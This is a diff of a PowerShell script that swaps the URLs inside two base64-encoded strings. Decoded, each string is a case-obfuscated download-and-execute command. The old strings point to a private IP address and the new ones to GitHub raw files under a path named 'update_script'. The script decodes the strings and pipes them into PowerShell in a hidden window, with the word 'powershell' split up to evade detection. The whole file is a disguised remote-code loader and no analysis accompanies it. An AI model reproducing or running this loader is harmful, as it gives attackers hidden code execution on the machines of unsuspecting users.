@@ -1,5 +1,8 @@
-$a1 = "SW5WT2tFLUVYcHJlU1NJb04gKE5ldy1PQmpFQ3QgTmVULldFYkNMaWVuVCkuRG93TmxPYURTVHJpbkcoJ2h0dHA6Ly8xMC4wLjEzLjc1OjgwMDAvYTEnKQ=="
-$r1 = "SW5WT2tFLUVYcHJlU1NJb04gKE5ldy1PQmpFQ3QgTmVULldFYkNMaWVuVCkuRG93TmxPYURTVHJpbkcoJ2h0dHA6Ly8xMC4wLjEzLjc1OjgwMDAvcjEnKQ=="
+#$a1 = "SW5WT2tFLUVYcHJlU1NJb04gKE5ldy1PQmpFQ3QgTmVULldFYkNMaWVuVCkuRG93TmxPYURTVHJpbkcoJ2h0dHA6Ly8xMC4wLjEzLjc1OjgwMDAvYTEnKQ=="
+#$r1 = "SW5WT2tFLUVYcHJlU1NJb04gKE5ldy1PQmpFQ3QgTmVULldFYkNMaWVuVCkuRG93TmxPYURTVHJpbkcoJ2h0dHA6Ly8xMC4wLjEzLjc1OjgwMDAvcjEnKQ=="
+
+$a1 = "SW5WT2tFLUVYcHJlU1NJb04gKE5ldy1PQmpFQ3QgTmVULldFYkNMaWVuVCkuRG93TmxPYURTVHJpbkcoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jdWRrYWphay9zdG9yYWdlX3VuaXQxMy9tYWluL3VwZGF0ZV9zY3JpcHQvYTEnKQo="
+$r1 = "SW5WT2tFLUVYcHJlU1NJb04gKE5ldy1PQmpFQ3QgTmVULldFYkNMaWVuVCkuRG93TmxPYURTVHJpbkcoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jdWRrYWphay9zdG9yYWdlX3VuaXQxMy9tYWluL3VwZGF0ZV9zY3JpcHQvcjEnKQo="
 
 start-sleep -s 1
 
@@ -11,4 +14,3 @@ $update_a1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64
 $update_r1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($r1))
 
 echo $update_a1 | pow""ersh""ell -nop - ; echo $update_r1 | pow""e""rsh""ell -nop -windowstyle hidden -
-
